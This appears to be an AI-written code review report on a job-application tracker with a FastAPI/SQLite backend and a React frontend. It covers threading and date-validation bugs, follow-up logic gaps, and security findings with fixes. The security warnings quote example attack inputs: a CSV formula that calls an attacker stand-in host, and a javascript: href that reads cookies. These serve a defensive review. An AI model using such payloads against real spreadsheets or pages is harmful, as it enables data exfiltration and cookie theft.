---
phase: 07-application-tracker-pipeline-follow-up
reviewed: 2026-11-10T00:00:00Z
depth: standard
files_reviewed: 25
files_reviewed_list:
  - .gitignore
  - backend/app/config.py
  - backend/app/main.py
  - backend/app/routes/tracker.py
  - backend/app/tracker/__init__.py
  - backend/app/tracker/db.py
  - backend/app/tracker/models.py
  - backend/app/tracker/service.py
  - backend/tests/test_tracker_api.py
  - backend/tests/test_tracker_db.py
  - backend/tests/test_tracker_service.py
  - frontend/package.json
  - frontend/src/App.tsx
  - frontend/src/api/client.ts
  - frontend/src/components/ResumeResult.tsx
  - frontend/src/components/tracker/CandidaturaCard.tsx
  - frontend/src/components/tracker/CandidaturaForm.tsx
  - frontend/src/components/tracker/ContadoresGrid.tsx
  - frontend/src/components/tracker/EstagioManager.tsx
  - frontend/src/components/tracker/EventosPanel.tsx
  - frontend/src/components/tracker/KanbanBoard.tsx
  - frontend/src/constants/ui.ts
  - frontend/src/pages/CandidaturaHome.tsx
  - frontend/src/pages/CurriculoHome.tsx
  - frontend/src/pages/TrackerHome.tsx
findings:
  critical: 2
  warning: 5
  info: 5
  total: 12
status: issues_found
---

# Phase 7: Code Review Report

**Reviewed:** 2026-11-10
**Depth:** standard
**Files Reviewed:** 25
**Status:** issues_found

## Summary

The tracker surface is well-organized (parameterized SQL verified — no user data is ever interpolated into statement text; envelope contract honored on the happy paths; no `dangerouslySetInnerHTML`/`innerHTML` anywhere; `new Date(` is genuinely absent from all tracker components, so the server-derived rendering contract holds; no LLM usage; archive-only posture pinned by tests; the 73-test offline suite passes). However, adversarial review found **two proven critical defects**: (1) the central SQLite threading contract is false — under a real uvicorn server with concurrent requests, the yield-dependency connection is used across threadpool threads and raises `sqlite3.ProgrammingError` on 223/240 requests in a repro, including a silent-data-loss mode where a mutation answers `{"status":"ok"}` and the teardown commit then fails, rolling the write back; (2) date fields are validated by regex only, so calendar-invalid dates (`2026-02-30`) are accepted and then crash unguarded `date.fromisoformat` projections — a single poisoned event row makes `GET /api/tracker/resumo` return HTTP 500 permanently, taking down the entire tracker UI. The offline suite cannot catch either: TestClient serializes requests (masking the threading bug), and no invalid-calendar-date vectors exist. Five warnings cover follow-up lifecycle dead-ends, a CSV-injection bypass, an XSS sink on `link_vaga`, and an edit-form functional gap.

## Critical Issues

### CR-01: SQLite connection used across threads under concurrency — `sqlite3.ProgrammingError` + silent data loss (200 ok, write rolled back)

**File:** `backend/app/tracker/db.py:94`, `backend/app/routes/tracker.py:72-82`
**Issue:** `conectar()` opens `sqlite3.connect(TRACKER_DB)` with the default `check_same_thread=True`, and the module docstring claims "connections are ALWAYS per-request — opened ... on the thread that serves the request, never shared across threads." That claim is false for the FastAPI yield-dependency pattern: `fastapi.concurrency.contextmanager_in_threadpool` (fastapi 0.141.1 installed) runs `cm.__enter__` and `cm.__exit__` in **separate** `run_in_threadpool`/`anyio.to_thread.run_sync` calls, and the sync route handler runs in yet another threadpool call — anyio gives no same-thread guarantee. The teardown executes `conn.commit()` and `conn.close()` on a possibly different thread, and the handler's SQL can also run on a different thread than the one that opened the connection.

Empirically proven against a real uvicorn server (20 concurrent clients, this exact dependency shape): 223/240 handler requests raised `sqlite3.ProgrammingError: SQLite objects created in a thread can only be used in that same thread`, and 444 teardown mismatches occurred (`commit`/`close` both failing across threads). Failure modes in the shipped code:

1. Handler-thread mismatch → `ProgrammingError` is a subclass of `sqlite3.Error` → the route answers a spurious `{"status":"erro", "erros":[_FALHA_GENERICA]}` envelope even though nothing is wrong.
2. Teardown mismatch after a successful handler → `conn.commit()` raises **outside** the route's try; FastAPI 0.106+ runs dependency exit code after the response is sent, so the client already received `{"status":"ok", "candidatura":...}` — then the never-committed transaction is rolled back on GC. **Silent data loss: the UI reports success; the row is gone.**

The test suite cannot catch this: TestClient serializes each request through its own portal, so `__enter__`/handler/`__exit__` always land on the same idle thread (verified: 0 mismatches over 360 TestClient requests). Real browser usage triggers concurrency easily (React Query fires the mutation refetch concurrently with other `['tracker']` traffic; CandidaturaHome shares the same key).

**Fix:** confine-scope relaxation is the FastAPI-documented remedy for exactly this pattern — the connection object is still confined to a single request's lifecycle (never shared across requests), so cross-thread use within one request is safe:

```python
# backend/app/tracker/db.py
def conectar() -> sqlite3.Connection:
    conn = sqlite3.connect(TRACKER_DB, check_same_thread=False)
    ...
```

and update the module docstring + `get_tracker_db` docstring: the guarantee is "one connection per request, used by only that request (which may span threadpool workers)", not "never used across threads". Optionally add a concurrency regression test with a real `uvicorn.Server` on a thread + `httpx.Client` pool, since TestClient masks the bug.

### CR-02: Calendar-invalid dates accepted (regex-only validation) → unhandled `ValueError` → HTTP 500 on create; one poisoned event row breaks `GET /api/tracker/resumo` permanently

**File:** `backend/app/tracker/models.py:34`, `backend/app/tracker/service.py:693-743` (also `service.py:347`)
**Issue:** `_PADRAO_DATA = r"^\d{4}-\d{2}-\d{2}$"` checks format only. `date.fromisoformat` is then called unguarded on `prazo_retorno` and every `data_evento` inside `derivar_campos` (service.py:693, 697-699, 706, 709-718, 726-733) and on `nova_data` in `adiar_followup` (service.py:347). The routes catch only `(TrackerErro, sqlite3.Error)`, so the `ValueError` escapes as an HTTP 500 — a violation of the house 200-envelope contract. Verified:

- `POST /api/tracker/candidaturas` with `"prazo_retorno": "2026-02-30"` → **HTTP 500** (`ValueError: day is out of range for month` in `derivar_campos`, called from `criar_candidatura`).
- `POST .../eventos` with `"data_evento": "2026-13-05"` → **200 ok** (`adicionar_evento` never parses the date; the poisoned row commits), after which `GET /api/tracker/resumo` → **HTTP 500 on every call**. The tracker UI (TrackerHome, and the association picker in CandidaturaHome — both share `['tracker']`) is dead until the DB is manually repaired. A `followup` event with an invalid date also poisons `executar/adiar` projections.
- `POST .../followups/adiar` with `"nova_data": "2027-02-30"` on a candidatura with a pending follow-up → `ValueError` at service.py:347 → HTTP 500.

**Fix:** validate calendar validity at the DTO boundary so bad input becomes a 422 and never reaches storage:

```python
# backend/app/tracker/models.py
from datetime import date
from pydantic import AfterValidator, Field
from typing import Annotated

def _data_iso_valida(v: str) -> str:
    date.fromisoformat(v)  # raises ValueError -> pydantic 422
    return v

DataISO = Annotated[str, AfterValidator(_data_iso_valida)]

# then:
data_aplicacao: str | None = Field(default=None, pattern=_PADRAO_DATA)
# ... or simply use date-typed fields and .isoformat() at the service boundary
```

Apply `DataISO` to `data_aplicacao`, `prazo_retorno`, `data_evento`, and `nova_data`. Optionally, defense-in-depth: wrap the per-row projection in `obter_resumo` so one corrupt legacy row degrades to a per-candidatura erro instead of a 500 for the whole payload.

## Warnings

### WR-01: A lapsed (vencido) follow-up is permanently unresolvable — the red line can never be cleared

**File:** `backend/app/tracker/service.py:286-294, 709-743`
**Issue:** `followup_vencido` is "any followup dated before hoje" (service.py:730-734), but no mutation can ever act on a past followup: `_followup_nao_passado` selects only `data_evento >= hoje` (service.py:289), `executar`/`adiar` refuse when it returns None, and D-04 forbids any event-deletion route. Once a follow-up date passes without being executed, the EventosPanel red "Follow-up venceu há X dias" line (with a growing day count) renders **forever**, and registering a new future follow-up does not clear it (both `pendante` and `vencido` blocks then render simultaneously). The state machine has a reachable absorbing failure state with no in-app remedy.

**Fix:** product decision required, but a minimal deterministic remedy consistent with the data-inferred design: widen `executar_followup` to target the earliest followup overall (`data_evento >= hoje` first, else the earliest past one) so "Executar" can settle a lapsed follow-up, or add a derived "resolver" action that re-dates the earliest vencido followup to hoje via the existing `executar` path.

### WR-02: Follow-up controls vanish on the day the follow-up is due

**File:** `frontend/src/components/tracker/EventosPanel.tsx:102`, `backend/app/tracker/service.py:708-713 vs 286-294`
**Issue:** the service deliberately includes today (`data_evento >= hoje`) so a due-today follow-up "stays executable/postponable on the day it comes due" (service.py:278-285), but the UI gates Executar/Adiar on `followup_pendente`, which the server computes **strictly** future (`data_evento > hoje`, service.py:725-729). On the due date both flags are false (`pendente` requires > hoje, `vencido` requires < hoje), so the pendente line and both buttons unmount — the follow-up is unmanageable on exactly its most important day, and tomorrow it enters the WR-01 dead-end. Service capability and UI gate disagree.

**Fix:** either relax the server flag to include today (`followup_pendente := any followup data_evento >= hoje`, keeping `followup_vencido` strictly past) — the UI then shows Executar/Adiar on the due day — or document the due-day blind window as intended and surface a third "vence hoje" state server-side.

### WR-03: CSV formula-injection guard misses the tab/CR prefix bypass

**File:** `backend/app/tracker/service.py:512-519`
**Issue:** `_sanitizar_celula` prefixes an apostrophe only when the first char is `= + - @`. The OWASP CSV-injection guidance (and Excel's actual behavior) also treats cells beginning with a **tab (`\t`) or carriage return (`\r`)** as executable: a `link_vaga`, `fonte`, or `notas` value pasted from a job ad such as `"\t=WEBSERVICE(\"http://attacker/?\")"` passes through unsanitized into the export that the docstring says "the export's consumers open it in Excel". The pinned scope (`= + - @`) is implemented, but the guard's stated purpose (T-07-02) is defeated by the known bypass.

**Fix:**
```python
if texto[:1] in ("=", "+", "-", "@", "\t", "\r"):
    return "'" + texto
```

### WR-04: `link_vaga` rendered as a raw anchor href — `javascript:`/`data:` scheme XSS sink

**File:** `frontend/src/pages/TrackerHome.tsx:495-500`, `backend/app/tracker/models.py:51`
**Issue:** the detail grid renders `<a href={valor} target="_blank" rel="noreferrer">` for `link_vaga` verbatim. The backend DTO constrains only `max_length=2000` (models.py:51) — no scheme validation — and the client-side `type="url"` input never re-validates on the edit path. A pasted value like `javascript:alert(document.cookie)` (job-ad link fields are semi-trusted external content) produces a clickable script URL; React does not sanitize `href` schemes. Single-user self-XSS in the common case, but it contradicts the S10 "no raw-HTML path" posture and executes with app origin.

**Fix:** render the anchor only for `http:`/`https:` schemes, otherwise fall back to the plain-text cell:

```tsx
const seguro = /^https?:\/\//i.test(valor)
// ...seguro ? <a href={valor} ...> : <dd>{valor}</dd>
```

(preferably also enforce an http(s) prefix in `CandidaturaEdicaoRequest.link_vaga` server-side).

### WR-05: The edit form can never clear any optional field — omitted empty keys mean "untouched" and null is never sent

**File:** `frontend/src/components/tracker/CandidaturaForm.tsx:136-148`, `frontend/src/api/client.ts:350-363`, `backend/app/tracker/service.py:190-226`
**Issue:** the form omits every empty optional from the payload, and the backend treats `None` as untouched. `CandidaturaEdicaoPayload` (client.ts:350-363) explicitly supports `string | null` clearing, but the form never sends `null` — so once `fonte`, `link_vaga`, `data_aplicacao`, `prazo_retorno`, `faixa_salarial`, `contato_recrutador`, `modalidade`, `notas`, or `jd_texto` is set, it cannot be removed through the UI (e.g., a wrongly pasted `prazo_retorno` drives the D-09 chip/atrasado state forever, and a set `modalidade` cannot be unset). In edit mode, typed-then-emptied inputs silently mean "keep the old value," which the user has no way to discover.

**Fix:** in edit mode (`modoEdicao`), send explicit `null` for optional fields the user cleared (a field is "cleared" if `valoresIniciais[field]` was non-empty and the draft is empty), e.g. build the payload as `valor.trim() ? valor.trim() : (inicial ? null : undefined)` per field — the wire contract and service already handle `None`-vs-null correctly (the Python side distinguishes key-absent from explicit `None` only at the JSON layer, so send `null` only for fields present in `valoresIniciais`).

## Info

### IN-01: `EstagioEdicaoRequest.ordem` is a dead field that answers a misleading erro

**File:** `backend/app/tracker/models.py:116-128`, `backend/app/tracker/service.py:386-404`
**Issue:** the rename DTO advertises `ordem` ("rename and/or reorder"), but `renomear_estagio` only ever consumes `nome`; a valid `PUT /api/tracker/estagios/{id}` body `{"ordem": 2}` passes the at-least-one-field validator and then fails with "Informe o novo nome do estágio." — a user-facing lie (a field was informed). No caller sends `ordem` (the UI uses `/reordenar`).
**Fix:** drop `ordem` from `EstagioEdicaoRequest` (reorder lives in `/estagios/reordenar`), or route it to the reorder service.

### IN-02: Migration atomicity claim does not hold — `executescript` autocommits and `user_version` is stamped outside the transaction

**File:** `backend/app/tracker/db.py:102-117`
**Issue:** the docstring says "each entry in MIGRATIONS is one transactional step", but `sqlite3.executescript` implicitly commits any pending transaction before executing, and the script's DDL/seed statements then run in autocommit; `PRAGMA user_version` is also set after the `with conn` block. A mid-script failure (e.g., the seed INSERT violating a constraint) leaves a partial schema with `user_version = 0`, and every subsequent auto-migrate retries `CREATE TABLE` and fails loudly on the same statement. Harmless today (single v1 migration, loud failure), but the invariant is false the moment MIGRATIONS grows.
**Fix:** wrap each migration's statements with explicit `BEGIN`/`COMMIT` inside the script text (or execute statements individually inside the `with conn` block), then stamp `user_version` inside that same transaction.

### IN-03: Malformed `TRACKER_FOLLOWUP_SUGGEST_DAYS` env var crashes the app at import

**File:** `backend/app/config.py:72`
**Issue:** `int(os.environ.get("TRACKER_FOLLOWUP_SUGGEST_DAYS", "7"))` raises `ValueError` at import time for a non-numeric value, killing every route including the non-tracker ones. Contrast the module's own "tolerant read" posture used for `OPENROUTER_API_KEY`.
**Fix:** wrap in try/except and fall back to 7 (log a warning), e.g. `TRACKER_FOLLOWUP_SUGGEST_DAYS = int(...) if str.isdigit() else 7`.

### IN-04: Association event date sourced client-side can disagree with the server's "hoje"

**File:** `frontend/src/pages/CandidaturaHome.tsx:59-64`
**Issue:** `hojeLocalIso()` builds the 'resposta' event's `data_evento` from client local parts. The docstring correctly avoids `toISOString()` UTC shifts, but the client's calendar date can still differ from the server's `date.today()` around midnight or across timezones (server deployed in a different TZ, e.g. the homelab bind-mount target). A future-dated 'resposta' event is excluded from the suggestion anchor until that date passes (service.py:696-700), so the D-12 badge timing can silently skew by a day. This is an input-assembly choice, not display recomputation, so the Pitfall-7 pin is not violated — but the server owns "hoje" everywhere else.
**Fix (low priority):** make `data_evento` optional server-side for the association path (default `date.today().isoformat()`), or accept the documented one-day skew.

### IN-05: `registrarDesabilitado` prop declared and documented but never supplied at the only call site

**File:** `frontend/src/components/ResumeResult.tsx:502`, `frontend/src/pages/CurriculoHome.tsx:883-894`
**Issue:** ResumeResult's D-13 prop contract says "Shared lock passthrough (long op in flight) for the registrar button", but CurriculoHome passes only `onRegistrarCandidatura` — never `registrarDesabilitado` — so the button stays enabled while `gerar`/`exportar`/`regenerar` are in flight, unlike every other card action which honors `locksEdicao`. The closure reads `trimmed`/`idioma` at click time, so no data corruption results, but the documented lock contract is dead code.
**Fix:** pass `registrarDesabilitado={operacaoLongaPendente}` from CurriculoHome, or remove the prop.

---

## Verification notes

- **Threading (CR-01):** reproduced with a real `uvicorn.Server` + 20 concurrent `httpx` clients using the exact `get_tracker_db` shape — 223/240 handler `sqlite3.ProgrammingError`s, 444 teardown mismatches. Same repro under TestClient: 0 mismatches (request serialization masks the bug), which is why the offline suite is green (73 passed).
- **Dates (CR-02):** reproduced through `TestClient(app, raise_server_exceptions=False)`: invalid `prazo_retorno` → HTTP 500 on create; invalid event `data_evento` accepted with `200 ok`, then `GET /api/tracker/resumo` → HTTP 500 on every subsequent call.
- **Checked and clean:** parameterized SQL everywhere (the two f-string statements use compile-time constants only — db.py:110/117, service.py:224 draws identifiers from `_CAMPOS_EDICAO`); no `dangerouslySetInnerHTML`/`innerHTML`; `new Date(` absent from all tracker components (server-derived contract holds); no LLM usage in tracker code (D-15); no destructive candidatura path (D-04, pinned by tests); reorder-before-parameterized-route and SPA-mount ordering pins verified in source; `reordenar_estagios` duplicate/partial-list rejection correct; `remover_estagio` reference count + renumbering correct; BOM + `;` delimiter + backend filename transport verified end-to-end in tests.

_Reviewed: 2026-11-10_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
